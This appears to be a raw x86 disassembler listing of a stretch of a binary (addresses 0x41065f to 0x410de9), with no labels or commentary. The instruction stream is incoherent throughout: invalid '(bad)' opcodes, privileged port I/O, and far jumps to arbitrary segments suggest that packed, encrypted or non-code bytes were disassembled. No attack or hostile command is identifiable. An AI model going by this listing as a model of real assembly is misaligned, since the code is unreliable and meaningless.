  41065f:	mov    dl,0x33
  410661:	fild   DWORD PTR [eax+0x2c287673]
  410667:	leave  
  410668:	clc    
  410669:	call   0xcb34:0x8bb01133
  410670:	shr    esp,1
  410672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410673:	push   esi
  410674:	or     ebx,edi
  410676:	test   BYTE PTR ds:0x7ddfa9f2,cl
  41067c:	bound  esi,QWORD PTR [ebp+esi*8-0x3f8e8969]
  410683:	mov    esp,0x5663a485
  410688:	sbb    BYTE PTR [edi+0x7],dh
  41068b:	xchg   ecx,eax
  41068c:	dec    eax
  41068d:	fnsave [ecx+ebx*2-0x4e36bea5]
  410694:	mul    BYTE PTR [edx+0x4416da65]
  41069a:	dec    eax
  41069b:	jmp    0x3bd7:0x10b851a8
  4106a2:	dec    eax
  4106a3:	imul   eax,DWORD PTR [edx],0x38608054
  4106a9:	sub    ah,BYTE PTR [ebx]
  4106ab:	cmp    BYTE PTR [eax],0x60
  4106ae:	mov    esp,DWORD PTR [esi]
  4106b0:	scas   ax,WORD PTR es:[edi]
  4106b2:	mov    edi,ebp
  4106b4:	push   es
  4106b5:	stos   BYTE PTR es:[edi],al
  4106b6:	clc    
  4106b7:	out    0x23,eax
  4106b9:	mov    BYTE PTR [edx+ebx*8-0x2],dh
  4106bd:	mov    fs,WORD PTR [ecx+0xe60492a]
  4106c3:	jp     0x4106ee
  4106c5:	xchg   ecx,eax
  4106c6:	or     BYTE PTR [eax],dl
  4106c8:	lahf   
  4106c9:	mov    dh,0xcc
  4106cb:	rcl    DWORD PTR [edx],1
  4106cd:	repnz push eax
  4106cf:	pop    ebx
  4106d0:	imul   edi,DWORD PTR [ecx+0x7d],0x1a
  4106d4:	mov    dl,0xb8
  4106d6:	ins    BYTE PTR es:[edi],dx
  4106d7:	adc    ah,ch
  4106d9:	push   edi
  4106da:	inc    eax
  4106db:	stc    
  4106dc:	(bad)  
  4106dd:	xchg   edx,eax
  4106de:	mov    bl,0x10
  4106e0:	inc    eax
  4106e1:	mov    edi,0x7b2a8756
  4106e6:	inc    eax
  4106e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106e8:	mov    DWORD PTR [eax],edi
  4106ea:	cld    
  4106eb:	test   BYTE PTR [edx+eiz*1-0xba24a57],0xf3
  4106f3:	repz leave 
  4106f5:	mov    edx,0x8cc92ff0
  4106fa:	sbb    esp,edx
  4106fc:	mov    ch,0x52
  4106fe:	xlat   BYTE PTR ds:[ebx]
  4106ff:	or     eax,0x72aba326
  410704:	imul   ecx,ebp,0x63
  410707:	push   esi
  410708:	retf   
  410709:	cld    
  41070a:	add    edi,DWORD PTR [eax]
  41070c:	mov    al,0x5e
  41070e:	sub    bh,cl
  410710:	cmc    
  410711:	and    ah,BYTE PTR [esi-0x239a3e40]
  410717:	cmp    eax,DWORD PTR ds:[edi]
  41071a:	aaa    
  41071b:	lods   eax,DWORD PTR ds:[esi]
  41071c:	(bad)  
  41071d:	icebp  
  41071e:	test   ebp,0xf2f9e2fb
  410724:	push   ss
  410725:	xor    edx,DWORD PTR [eax-0x531919ef]
  41072b:	push   ebp
  41072c:	lds    esp,FWORD PTR [esi]
  41072e:	mov    dl,0x15
  410730:	or     edi,DWORD PTR [ecx+0x4f575c68]
  410736:	mov    cl,BYTE PTR [edx+esi*1+0x17b1e40c]
  41073d:	sub    BYTE PTR [eax-0x50048e0c],al
  410743:	mov    dl,0xd6
  410745:	outs   dx,BYTE PTR ds:[esi]
  410746:	xor    dl,dl
  410748:	bound  eax,QWORD PTR ss:[edx+0x42]
  41074c:	sbb    dh,BYTE PTR [ebx-0x64]
  41074f:	or     bl,BYTE PTR [ebx-0x100244b]
  410755:	(bad)  
  410756:	mov    edx,0xcb93e22
  41075b:	nop
  41075c:	push   ss
  41075d:	sub    dh,BYTE PTR [edi-0x48b57604]
  410763:	cmp    ebp,DWORD PTR [ecx-0x3c36ce1e]
  410769:	xor    al,0x2c
  41076b:	sub    dl,BYTE PTR [eax]
  41076d:	aaa    
  41076e:	pop    eax
  41076f:	stos   DWORD PTR es:[edi],eax
  410770:	loopne 0x41070f
  410772:	xor    eax,0x92817904
  410777:	adc    ebp,edi
  410779:	sbb    eax,0xab17332c
  41077e:	dec    edi
  41077f:	xchg   DWORD PTR [esi+0x69941926],ebx
  410785:	sub    DWORD PTR ds:0xbe8cd4b2,ebx
  41078b:	scas   al,BYTE PTR es:[edi]
  41078c:	cwde   
  41078d:	add    DWORD PTR [esi],ebx
  41078f:	sub    al,0xb2
  410791:	jno    0x41071d
  410793:	call   0xc8cd:0x3b34f950
  41079a:	movsx  edi,WORD PTR [edi-0x32]
  41079e:	cdq    
  41079f:	call   0x23f4:0xb4378c77
  4107a6:	je     0x4107ed
  4107a8:	(bad)  
  4107aa:	push   edi
  4107ab:	adc    bl,dh
  4107ad:	push   ss
  4107ae:	enter  0xc947,0x46
  4107b2:	sbb    eax,0xb32c87e1
  4107b7:	push   ss
  4107b8:	push   0x7163bafb
  4107bd:	cs mov esp,ss
  4107c0:	push   ecx
  4107c1:	xchg   esp,eax
  4107c2:	push   ebx
  4107c3:	push   esp
  4107c4:	dec    ebp
  4107c5:	sbb    dh,dh
  4107c7:	sub    BYTE PTR [eax+ebp*1],dl
  4107ca:	push   es
  4107cb:	mov    ds:0xcbb330e4,al
  4107d0:	push   ebx
  4107d1:	sbb    al,0x5f
  4107d3:	jle    0x4107e2
  4107d5:	int3   
  4107d6:	dec    edx
  4107d7:	jb     0x4107d1
  4107d9:	sub    eax,0xf7dac68d
  4107de:	mov    al,0xde
  4107e0:	sar    BYTE PTR [edx-0xb1e146f],cl
  4107e6:	mov    al,0xf1
  4107e8:	mov    eax,0x42de305d
  4107ed:	call   0xc0a1:0xedcb35cd
  4107f4:	jae    0x410783
  4107f6:	mov    eax,0x9bbbed7f
  4107fb:	div    BYTE PTR [edi-0x6]
  4107fe:	sbb    dh,BYTE PTR [ebx+edx*1+0x7687635b]
  410805:	pusha  
  410806:	cs dec ebx
  410808:	sahf   
  410809:	mov    ds:0x1932aad6,al
  41080e:	stos   DWORD PTR es:[edi],eax
  41080f:	gs xor al,0xf7
  410812:	push   cs
  410813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410814:	mov    bh,BYTE PTR ss:[eax+0x78]
  410818:	data16 je 0x41088f
  41081b:	ds out 0xae,al
  41081e:	mov    al,0xf
  410820:	pop    esi
  410821:	sbb    al,0xd7
  410823:	lock mov esi,0x3cf1bda2
  410829:	jge    0x4107e3
  41082b:	sub    al,0x50
  41082d:	jbe    0x4107f6
  41082f:	(bad)  
  410830:	fisub  DWORD PTR [ecx-0x1e8dad6f]
  410836:	div    BYTE PTR [esi-0x7908de8c]
  41083c:	jmp    0xfaef:0xdfbb45c8
  410843:	pop    ebx
  410844:	and    al,0xba
  410846:	add    ah,al
  410848:	xor    BYTE PTR [edx-0x55],cl
  41084b:	sub    al,0xc4
  41084d:	imul   edx,DWORD PTR [ecx+0x45],0xffffffcd
  410851:	scas   eax,DWORD PTR es:[edi]
  410852:	sti    
  410853:	pop    ds
  410854:	inc    ebx
  410855:	and    ecx,DWORD PTR [ecx]
  410857:	in     eax,dx
  410858:	push   ebx
  410859:	adc    DWORD PTR [ebp-0x32dfb9a3],esi
  41085f:	xor    DWORD PTR [esi-0x50],edx
  410862:	mov    al,0xf2
  410864:	cdq    
  410865:	stos   BYTE PTR es:[edi],al
  410866:	cwde   
  410867:	mov    dl,0x62
  410869:	adc    dl,BYTE PTR [eax-0x72a7959c]
  41086f:	and    eax,0x9ae5d93c
  410874:	repz mov eax,0xd5c28e3f
  41087a:	iret   
  41087b:	int3   
  41087c:	rcr    BYTE PTR [ebx+0x32],1
  41087f:	xchg   DWORD PTR ds:[edi-0xe],edx
  410883:	daa    
  410884:	fist   DWORD PTR [eax-0x47]
  410887:	gs je  0x4108f9
  41088a:	out    dx,al
  41088b:	pusha  
  41088c:	mov    ds:0xb902b1ef,al
  410891:	mov    ebx,0x5de52bfe
  410896:	sub    edi,edx
  410898:	cmp    eax,0xe7103c18
  41089d:	ins    DWORD PTR es:[edi],dx
  41089e:	push   eax
  41089f:	fsubr  DWORD PTR [eax]
  4108a1:	cwde   
  4108a2:	sti    
  4108a3:	imul   ebx,ecx,0x3
  4108a6:	or     edi,ebx
  4108a8:	stos   DWORD PTR es:[edi],eax
  4108a9:	mov    ah,ch
  4108ab:	cmc    
  4108ac:	int    0xb8
  4108ae:	sbb    edi,ebp
  4108b0:	push   esp
  4108b1:	pop    ecx
  4108b2:	fisubr DWORD PTR [ecx+ebp*2]
  4108b5:	lea    ecx,[ebx+0x30]
  4108b8:	adc    ah,BYTE PTR ds:0xc5219d12
  4108be:	jno    0x4108db
  4108c0:	pop    es
  4108c1:	adc    ch,BYTE PTR [ebp-0xa]
  4108c4:	int    0x15
  4108c6:	inc    esp
  4108c7:	jns    0x41089e
  4108c9:	jl     0x41089f
  4108cb:	fsub   QWORD PTR [edx-0x50]
  4108ce:	sti    
  4108cf:	lock xor bh,BYTE PTR [edi]
  4108d2:	js     0x41088f
  4108d4:	inc    ecx
  4108d5:	xor    BYTE PTR [edi+eiz*8],ch
  4108d8:	dec    edi
  4108d9:	jmp    0x5ae94a
  4108de:	sub    BYTE PTR [edi+0xfc2402b],al
  4108e4:	arpl   WORD PTR [esi+0x7db0da81],bx
  4108ea:	pop    ebp
  4108eb:	hlt    
  4108ec:	mov    ds:0x6266bad7,eax
  4108f1:	pop    ebp
  4108f2:	push   0x4e
  4108f4:	push   ss
  4108f5:	jns    0x410925
  4108f7:	xor    BYTE PTR ds:0x5735b5fc,bh
  4108fd:	or     al,0x8d
  4108ff:	pop    ss
  410900:	js     0x410968
  410902:	test   DWORD PTR fs:[esp+ecx*8-0x52],esi
  410907:	or     DWORD PTR [esi+0x35],esi
  41090a:	sti    
  41090b:	mov    al,ds:0xc528b328
  410910:	in     al,dx
  410911:	push   ds
  410912:	lds    ebp,FWORD PTR [edx]
  410914:	ret    0x4457
  410917:	daa    
  410918:	cmp    BYTE PTR [ebx-0x1df7c203],dl
  41091e:	ficomp DWORD PTR [esi+0x3bd578c8]
  410924:	add    eax,0x3a99e405
  410929:	mov    WORD PTR [edx-0x11],ss
  41092c:	cmp    ebp,DWORD PTR [ebx+edi*4+0x77]
  410930:	enter  0x6c7b,0xf9
  410934:	mov    ebx,?
  410936:	test   al,0x51
  410938:	pop    esp
  410939:	mov    edi,0xe7110c4d
  41093e:	adc    esi,ebx
  410940:	mov    ds:0xc7aa2c9c,al
  410945:	sbb    al,0x7c
  410947:	push   0x2760ee04
  41094c:	pop    ebx
  41094d:	pop    ss
  41094e:	mov    bh,0x58
  410950:	loope  0x410982
  410952:	stc    
  410953:	sub    DWORD PTR [eax],ebx
  410955:	xor    ecx,esi
  410957:	pop    eax
  410958:	jb     0x4109c7
  41095a:	js     0x410935
  41095c:	xchg   ecx,eax
  41095d:	(bad)  
  41095e:	xor    DWORD PTR [esi+edi*4+0x4dadd38b],ecx
  410965:	push   esp
  410966:	and    al,0xad
  410968:	(bad)  
  410969:	cs inc ecx
  41096b:	fist   WORD PTR [esi]
  41096d:	inc    esp
  41096e:	cmp    eax,0xa46daa73
  410973:	mov    al,0xb4
  410975:	mov    esi,DWORD PTR [edx]
  410977:	xchg   bl,ah
  410979:	mov    ds:0x9a76e124,eax
  41097e:	outs   dx,BYTE PTR ds:[esi]
  41097f:	xor    dh,BYTE PTR [esi-0x128ec356]
  410985:	in     eax,0x91
  410987:	imul   ecx,DWORD PTR [ecx],0xffffffc9
  41098a:	adc    cl,0x59
  41098d:	push   ss
  41098e:	popf   
  41098f:	mov    ds:0xa7577bfd,eax
  410994:	dec    edi
  410995:	jb     0x410a14
  410997:	cwde   
  410998:	sub    DWORD PTR [esi+0x3f82a188],ecx
  41099e:	fcmovu st,st(0)
  4109a0:	lods   eax,DWORD PTR ds:[esi]
  4109a1:	(bad)  
  4109a3:	jl     0x4109be
  4109a5:	lds    edx,FWORD PTR [eax]
  4109a7:	dec    ebx
  4109a8:	add    al,0xcd
  4109aa:	(bad)  
  4109ab:	out    dx,eax
  4109ac:	dec    ebx
  4109ad:	pop    eax
  4109ae:	jb     0x410a01
  4109b0:	(bad)  
  4109b2:	pop    ss
  4109b3:	add    al,0xa7
  4109b5:	mov    WORD PTR [edx],ds
  4109b7:	and    cl,cl
  4109b9:	rcl    BYTE PTR [edi-0x51495338],cl
  4109bf:	stos   DWORD PTR es:[edi],eax
  4109c0:	outs   dx,BYTE PTR ds:[esi]
  4109c1:	iret   
  4109c2:	lods   eax,DWORD PTR ds:[esi]
  4109c3:	xchg   esi,eax
  4109c4:	je     0x4109e9
  4109c6:	std    
  4109c7:	dec    edi
  4109c8:	jecxz  0x410a16
  4109ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cb:	mov    al,0xcb
  4109cd:	adc    DWORD PTR [edi+ebp*8-0x7],esp
  4109d1:	pop    eax
  4109d2:	push   ds
  4109d3:	ror    BYTE PTR [eax-0x71],0x1
  4109d7:	outs   dx,DWORD PTR ds:[esi]
  4109d8:	lock imul edi,edx,0x435549c3
  4109df:	push   edi
  4109e0:	push   0x2f
  4109e2:	fdivr  QWORD PTR [esp+ebp*8-0x67]
  4109e6:	mov    WORD PTR [eax],ds
  4109e8:	xchg   edi,eax
  4109e9:	(bad)  
  4109ea:	repz inc esp
  4109ec:	sbb    al,0x2a
  4109ee:	fidivr WORD PTR [edi]
  4109f0:	push   0xffffffad
  4109f2:	sub    DWORD PTR [edx],0xffffff97
  4109f5:	pop    esp
  4109f6:	mov    DWORD PTR [edi],ebx
  4109f8:	aaa    
  4109f9:	cdq    
  4109fa:	out    dx,eax
  4109fb:	ret    
  4109fc:	mov    eax,0x8260c2a4
  410a01:	mov    ebp,0x84924699
  410a06:	push   0xffffffcd
  410a08:	les    ebp,FWORD PTR [ebp+0x4d]
  410a0b:	sub    edi,DWORD PTR [esp+edx*8-0x330aad52]
  410a12:	into   
  410a13:	ins    DWORD PTR es:[edi],dx
  410a14:	fist   DWORD PTR [esi-0x40e0536f]
  410a1a:	xor    al,0x58
  410a1c:	jne    0x4109c8
  410a1e:	xchg   esi,eax
  410a1f:	push   gs
  410a21:	cs pop ebp
  410a23:	sub    edx,DWORD PTR [edx]
  410a25:	xor    al,0xed
  410a27:	xchg   esp,eax
  410a28:	outs   dx,BYTE PTR ds:[esi]
  410a29:	push   0x60a11f45
  410a2e:	sbb    al,0x25
  410a30:	not    BYTE PTR [ecx]
  410a32:	dec    esp
  410a33:	pop    edx
  410a34:	(bad)  
  410a35:	mov    ch,0x4a
  410a37:	push   edi
  410a38:	xlat   BYTE PTR ds:[ebx]
  410a39:	(bad)
  410a3c:	mov    esi,DWORD PTR [ecx+0x4fdfe5db]
  410a42:	xchg   esp,eax
  410a43:	cmp    al,0xfa
  410a45:	bound  ebp,QWORD PTR [esi]
  410a47:	dec    eax
  410a48:	xlat   BYTE PTR ds:[ebx]
  410a49:	and    BYTE PTR [esi],ch
  410a4b:	cmp    eax,0xb42f9de9
  410a50:	aaa    
  410a51:	int3   
  410a52:	adc    BYTE PTR [edi+0x24e16868],0x2
  410a59:	jbe    0x410a2d
  410a5b:	(bad)  
  410a5d:	mov    dh,0x88
  410a5f:	jb     0x410ab2
  410a61:	xchg   esi,eax
  410a62:	xor    DWORD PTR [edx],edx
  410a64:	enter  0x770c,0x87
  410a68:	pop    ebp
  410a69:	pop    ds
  410a6a:	jle    0x410ab3
  410a6c:	push   0x6d
  410a6e:	scas   eax,DWORD PTR es:[edi]
  410a6f:	jp     0x4109ff
  410a71:	jbe    0x410a78
  410a73:	xor    DWORD PTR [ebx+0x5a],0xf71bb9db
  410a7a:	xor    DWORD PTR es:[edx-0x68],0x31
  410a7f:	lea    esi,[edi]
  410a81:	pop    eax
  410a82:	clc    
  410a83:	out    0xcb,al
  410a85:	dec    esp
  410a86:	push   edx
  410a87:	pop    ds
  410a88:	in     al,dx
  410a89:	mov    ecx,0x63692ba9
  410a8e:	xchg   esp,eax
  410a8f:	jp     0x410ae2
  410a91:	daa    
  410a92:	in     eax,0x6f
  410a94:	lds    ecx,FWORD PTR [ebp+0x13d5b775]
  410a9a:	in     al,dx
  410a9b:	mov    ebp,edi
  410a9d:	sbb    BYTE PTR ds:0xcd062321,dl
  410aa3:	shl    DWORD PTR ds:0x3115995d,cl
  410aa9:	dec    esi
  410aaa:	retf   0x4527
  410aad:	mov    es,WORD PTR [esi+0x11]
  410ab0:	inc    eax
  410ab1:	mov    bl,0xb3
  410ab3:	iret   
  410ab4:	arpl   sp,dx
  410ab6:	loop   0x410ab1
  410ab8:	xor    eax,0xd06fc3b0
  410abd:	or     al,0x22
  410abf:	cli    
  410ac0:	lods   eax,DWORD PTR ds:[esi]
  410ac1:	pop    edi
  410ac2:	pushf  
  410ac3:	xor    eax,0xe88c93af
  410ac8:	loope  0x410a5f
  410aca:	pop    ecx
  410acb:	ret    
  410acc:	xchg   esp,eax
  410acd:	ss repnz in al,dx
  410ad0:	pop    esp
  410ad1:	lahf   
  410ad2:	(bad)  
  410ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad5:	scas   al,BYTE PTR es:[edi]
  410ad6:	cdq    
  410ad7:	cmp    eax,DWORD PTR [edx+0x27a892d2]
  410add:	cmc    
  410ade:	in     al,dx
  410adf:	rcr    DWORD PTR [esi-0x21f164ec],0xf5
  410ae6:	xor    eax,0x6d0815d9
  410aeb:	imul   ecx,edx,0xe1aacfd
  410af1:	push   esi
  410af2:	mov    edi,edx
  410af4:	popf   
  410af5:	arpl   WORD PTR [edx+ecx*8],sp
  410af8:	mov    edx,DWORD PTR [ebx-0x1a4b0e3b]
  410afe:	lock into 
  410b00:	imul   eax,DWORD PTR [ebp-0x56],0x73df6d77
  410b07:	int    0xe1
  410b09:	fs fwait
  410b0b:	mov    al,0x35
  410b0d:	test   bl,0xbf
  410b10:	ror    DWORD PTR [edx+0x37dadd64],0x1c
  410b17:	stos   DWORD PTR es:[edi],eax
  410b18:	mov    esp,0xcac9f7bf
  410b1d:	push   es
  410b1e:	shl    BYTE PTR [esi-0x73],1
  410b21:	cpuid  
  410b23:	aas    
  410b24:	mov    al,0xb9
  410b26:	jo     0x410b04
  410b28:	inc    edi
  410b29:	pop    ds
  410b2a:	stos   BYTE PTR es:[edi],al
  410b2b:	inc    ebp
  410b2c:	mov    bl,0x75
  410b2e:	sub    BYTE PTR [ecx],dl
  410b30:	aam    0x6a
  410b32:	mov    DWORD PTR [edx],esi
  410b34:	gs aam 0x3d
  410b37:	ret    
  410b38:	and    bl,BYTE PTR [eax+eiz*2]
  410b3b:	in     al,0x9f
  410b3d:	out    0x57,eax
  410b3f:	loope  0x410ac3
  410b41:	lds    ebx,FWORD PTR [ecx]
  410b43:	inc    ebp
  410b44:	push   es
  410b45:	(bad)  
  410b46:	xor    esi,DWORD PTR [edi]
  410b48:	repnz ins DWORD PTR es:[edi],dx
  410b4a:	xor    DWORD PTR [edx],ebx
  410b4c:	xchg   ebx,eax
  410b4d:	arpl   WORD PTR [edx],dx
  410b4f:	pop    edi
  410b50:	nop
  410b51:	adc    DWORD PTR fs:[edi+ecx*4],esi
  410b55:	std    
  410b56:	mov    al,0xd2
  410b58:	mov    ebx,0x8f08a622
  410b5d:	lea    ebp,[eax-0x24]
  410b60:	adc    ecx,DWORD PTR [edx+0x76]
  410b63:	cmc    
  410b64:	pop    ecx
  410b65:	push   ss
  410b66:	emms   
  410b68:	rcl    BYTE PTR [esi+0x4f63c068],cl
  410b6e:	push   edx
  410b6f:	int    0xa3
  410b71:	cs add dh,dl
  410b74:	dec    eax
  410b75:	popa   
  410b76:	es push edx
  410b78:	sub    al,0x75
  410b7a:	int    0x87
  410b7c:	sahf   
  410b7d:	sub    al,0x98
  410b7f:	or     BYTE PTR [ecx+0x3257fa2e],bl
  410b85:	jo     0x410b74
  410b87:	test   DWORD PTR [esi+0x5c],0x60487773
  410b8e:	mov    eax,ds:0x187c9430
  410b93:	sub    al,0x8c
  410b95:	lock ror DWORD PTR [esi],cl
  410b98:	lods   al,BYTE PTR ds:[esi]
  410b99:	(bad)  
  410b9a:	outs   dx,BYTE PTR ds:[esi]
  410b9b:	out    dx,al
  410b9c:	jo     0x410b4a
  410b9e:	jo     0x410bfc
  410ba0:	sub    al,0x18
  410ba2:	dec    edx
  410ba3:	imul   edi,DWORD PTR [eax+0x13],0xffffffa8
  410ba7:	mov    cl,0xc0
  410ba9:	or     al,0xac
  410bab:	test   DWORD PTR [edx+0x721d0d14],edx
  410bb1:	arpl   bx,ax
  410bb3:	mov    edi,DWORD PTR [ebp-0x7023c662]
  410bb9:	pop    edx
  410bba:	push   cs
  410bbb:	ds jecxz 0x410b4c
  410bbe:	cwde   
  410bbf:	or     edi,ecx
  410bc1:	jns    0x410bfe
  410bc3:	adc    eax,0x510dfe66
  410bc8:	sub    BYTE PTR [eax+0x8],bl
  410bcb:	stos   DWORD PTR es:[edi],eax
  410bcc:	sbb    edx,esi
  410bce:	push   0x0
  410bd0:	(bad)  
  410bd1:	xlat   BYTE PTR ds:[ebx]
  410bd2:	(bad)  
  410bd3:	test   al,0x80
  410bd5:	popf   
  410bd6:	fwait
  410bd7:	push   esi
  410bd8:	lods   eax,DWORD PTR ds:[esi]
  410bd9:	loopne 0x410c43
  410bdb:	fsub   st,st(0)
  410bdd:	fistp  WORD PTR [edi-0x1b]
  410be0:	in     eax,dx
  410be1:	push   0xffffffd2
  410be3:	fcmovbe st,st(3)
  410be5:	xchg   ebp,eax
  410be6:	enter  0x54a2,0xf3
  410bea:	sub    BYTE PTR [ecx-0x23],cl
  410bed:	xchg   edi,eax
  410bee:	test   ch,ah
  410bf0:	push   0x18
  410bf2:	xchg   esp,eax
  410bf3:	pop    edi
  410bf4:	(bad)  
  410bf5:	daa    
  410bf6:	mov    al,ds:0x71860f90
  410bfb:	es push 0x7b
  410bfe:	addr16 pop es
  410c00:	cdq    
  410c01:	mov    WORD PTR [esi+0x75],es
  410c04:	mov    BYTE PTR [ecx],ch
  410c06:	xchg   ebp,eax
  410c07:	jns    0x410c5b
  410c09:	arpl   WORD PTR [ebx],dx
  410c0b:	ret    0x307c
  410c0e:	jge    0x410be4
  410c10:	mov    WORD PTR [esi-0x37],ds
  410c13:	stc    
  410c14:	pop    esp
  410c15:	(bad)  
  410c16:	div    ecx
  410c18:	in     al,0x32
  410c1a:	or     al,0xe2
  410c1c:	or     BYTE PTR ds:[edx-0x5d],ch
  410c20:	push   0x1b28e8cf
  410c25:	shl    DWORD PTR [ebp-0x4c],0xd0
  410c29:	cmp    al,0xda
  410c2b:	cmc    
  410c2c:	sbb    DWORD PTR [edx-0x60369bb],esp
  410c32:	test   DWORD PTR [ebp+0x65aa11fc],ebx
  410c38:	mov    BYTE PTR [esi-0x38678100],0x36
  410c3f:	out    0x9f,eax
  410c41:	cmp    dh,BYTE PTR [edx]
  410c43:	lds    ecx,FWORD PTR [edx-0x7a]
  410c46:	daa    
  410c47:	repnz pusha 
  410c49:	jnp    0x410bd1
  410c4b:	lods   al,BYTE PTR ds:[esi]
  410c4c:	jno    0x410cad
  410c4e:	stc    
  410c4f:	icebp  
  410c50:	repz push edi
  410c52:	sub    dh,cl
  410c54:	jb     0x410c32
  410c56:	fisub  DWORD PTR [edi+0x6daa7c24]
  410c5c:	dec    edi
  410c5d:	xchg   edi,eax
  410c5e:	sub    al,0xd5
  410c60:	xor    bl,BYTE PTR ds:0xa49c5cb8
  410c66:	pusha  
  410c67:	imul   esp,eax,0x302a68df
  410c6d:	mov    dl,0x87
  410c6f:	ins    DWORD PTR es:[edi],dx
  410c70:	in     al,0x96
  410c72:	lods   al,BYTE PTR ds:[esi]
  410c73:	aad    0x8e
  410c75:	test   eax,0x74901fa1
  410c7a:	jne    0x410c41
  410c7c:	push   eax
  410c7d:	jne    0x410ccf
  410c7f:	dec    ebp
  410c80:	inc    eax
  410c81:	add    edi,DWORD PTR [edx-0x51ca13e1]
  410c87:	lods   al,BYTE PTR ds:[esi]
  410c88:	and    al,0x52
  410c8a:	jae    0x410c4d
  410c8c:	inc    eax
  410c8d:	aam    0x16
  410c8f:	cmp    dl,dh
  410c91:	ret    
  410c92:	and    eax,0xceab372a
  410c97:	or     eax,ebp
  410c99:	and    DWORD PTR [ecx*8+0x6b05c814],ebp
  410ca0:	out    0x80,al
  410ca2:	lock fwait
  410ca4:	(bad)  
  410ca5:	jmp    0xfd3a:0xc0c3c6b8
  410cac:	int3   
  410cad:	cmp    DWORD PTR [eax-0x5f4a40e5],ebp
  410cb3:	or     al,0xb0
  410cb5:	jns    0x410cf9
  410cb7:	mov    edi,0xb0627dab
  410cbc:	nop
  410cbd:	mov    eax,ds:0xd3ab4899
  410cc2:	mov    ds:0x860b329e,eax
  410cc7:	clc    
  410cc8:	js     0x410cfa
  410cca:	fwait
  410ccb:	cmp    DWORD PTR [edi],eax
  410ccd:	push   ss
  410cce:	jno    0x410d1f
  410cd0:	pop    DWORD PTR [edx]
  410cd2:	(bad)  
  410cd3:	and    al,0x25
  410cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cd6:	sub    BYTE PTR [eax+esi*4],ch
  410cd9:	pop    ebx
  410cda:	cmp    al,0x8a
  410cdc:	mov    ecx,0x128150c6
  410ce1:	push   ebp
  410ce2:	mov    esi,0xd449713a
  410ce7:	inc    esi
  410ce8:	sbb    bl,cl
  410cea:	out    0x16,al
  410cec:	dec    edx
  410ced:	ja     0x410c7f
  410cef:	pop    eax
  410cf0:	(bad)  
  410cf1:	sub    al,0xe3
  410cf3:	repz gs test dl,dl
  410cf7:	js     0x410d5d
  410cf9:	xchg   ebx,eax
  410cfa:	(bad)  
  410cfb:	ins    DWORD PTR es:[edi],dx
  410cfc:	hlt    
  410cfd:	jmp    0x410d22
  410cff:	outs   dx,DWORD PTR ds:[esi]
  410d00:	pop    esp
  410d01:	push   edx
  410d02:	std    
  410d03:	add    dh,al
  410d05:	and    al,0x5d
  410d07:	loope  0x410d51
  410d09:	and    al,0x5f
  410d0b:	fcmovb st,st(3)
  410d0d:	jl     0x410d3e
  410d0f:	and    BYTE PTR [esi],dl
  410d11:	fwait
  410d12:	adc    eax,0xd97ca655
  410d17:	pop    esi
  410d18:	add    ah,BYTE PTR [ecx+0x5e]
  410d1b:	ds push edi
  410d1d:	push   0x48
  410d1f:	xchg   esi,eax
  410d20:	jbe    0x410cb2
  410d22:	scas   eax,DWORD PTR es:[edi]
  410d23:	(bad)  
  410d24:	(bad)  
  410d25:	into   
  410d26:	sbb    eax,0x8ca03b1e
  410d2b:	push   ebp
  410d2c:	xchg   BYTE PTR [eax],dh
  410d2e:	mov    edi,0x3bb8fa63
  410d33:	fild   DWORD PTR es:[esi+0x49]
  410d37:	sub    BYTE PTR [eax+0x4d],cl
  410d3a:	add    BYTE PTR [ebx+0x10],al
  410d3d:	dec    ebx
  410d3e:	and    ch,bl
  410d40:	in     al,dx
  410d41:	rol    BYTE PTR [eax+0x34],cl
  410d44:	push   0xe42c7f95
  410d49:	push   es
  410d4a:	inc    edi
  410d4b:	push   ds
  410d4c:	inc    eax
  410d4d:	mov    ebx,0xb586f1e6
  410d52:	popa   
  410d53:	add    al,BYTE PTR [ecx+edx*2+0x1602ec29]
  410d5a:	sbb    eax,0x2da8790d
  410d5f:	or     ebp,esp
  410d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d62:	fwait
  410d63:	xchg   ebp,eax
  410d64:	inc    esp
  410d65:	sub    dl,cl
  410d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d68:	adc    DWORD PTR [ecx+0x7e],edi
  410d6b:	inc    ebp
  410d6c:	dec    edi
  410d6d:	jno    0x410d19
  410d6f:	xchg   esi,eax
  410d70:	mov    eax,DWORD PTR [esi-0x26]
  410d73:	and    bl,dl
  410d75:	inc    edi
  410d76:	icebp  
  410d77:	mov    bl,0x56
  410d79:	inc    edi
  410d7a:	neg    BYTE PTR [edx]
  410d7c:	adc    DWORD PTR [edx-0x3d],0xffffffc0
  410d80:	test   al,0x74
  410d82:	in     eax,0xa9
  410d84:	xchg   DWORD PTR [ebx+0x2e],esi
  410d87:	sub    ch,ch
  410d89:	mov    dh,0x4f
  410d8b:	mov    ch,0x21
  410d8d:	add    eax,0xf77e3257
  410d92:	and    al,0xe4
  410d94:	mov    ah,0xb5
  410d96:	cmp    eax,edx
  410d98:	outs   dx,DWORD PTR ds:[esi]
  410d99:	push   es
  410d9a:	pop    esi
  410d9b:	(bad)  
  410d9c:	mov    esp,0x84578345
  410da1:	or     bl,BYTE PTR ds:0xa6df6b4e
  410da7:	sub    DWORD PTR [eax+0x22],eax
  410daa:	outs   dx,WORD PTR ds:[esi]
  410dac:	call   0xdf6fb203
  410db1:	add    al,0x61
  410db3:	sbb    eax,0xd5e49c61
  410db8:	fld    DWORD PTR [eax+0x5469099b]
  410dbe:	enter  0x9e30,0x4f
  410dc2:	cli    
  410dc3:	add    DWORD PTR [edx+ebx*8+0x73],ebx
  410dc7:	adc    WORD PTR [ecx+0x7a2d437],cx
  410dce:	mov    ds,WORD PTR es:[ebp+0x29]
  410dd2:	in     al,0x60
  410dd4:	in     eax,0x93
  410dd6:	inc    ebp
  410dd7:	outs   dx,DWORD PTR ds:[esi]
  410dd8:	or     BYTE PTR [ebx-0x38acd590],al
  410dde:	ret    
  410ddf:	mov    bh,0x95
  410de1:	lea    esi,[eax+0x39cb4c6c]
  410de7:	data16 into 
  410de9:	and    esp,0xa
